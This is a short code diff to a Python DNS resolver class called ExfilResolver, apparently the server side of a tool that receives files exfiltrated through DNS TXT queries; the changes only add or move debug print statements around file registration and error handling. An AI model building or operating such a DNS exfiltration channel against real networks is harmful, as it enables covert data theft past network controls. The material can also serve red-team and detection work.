@@ -64,12 +64,13 @@ class ExfilResolver(BaseResolver):
         filename = qname.split(".")[2]
 
         if '-' in data: 
-            print("New file incoming, lines:", data.split("-")[1])
             if filename not in self.files:
+                print("New file incoming, lines:", data.split("-")[1])
                 self.files.update({filename: [None] * int(data.split("-")[1])})
                 reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Ready")))
                 return reply 
             else:
+                print("New file already exists", filename)
                 reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Exists")))
                 return reply 
             
@@ -81,9 +82,11 @@ class ExfilResolver(BaseResolver):
             else:
                 reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("data already received")))
         except KeyError:
+            print("Key error:84") 
             reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("File not found")))
             return reply
         except ValueError:
+            print("Key error:88") 
             reply.add_answer(RR(qname,QTYPE.TXT,ttl=self.ttl, rdata=TXT("Index not an int")))
             return reply
         self.checkfile(filename)
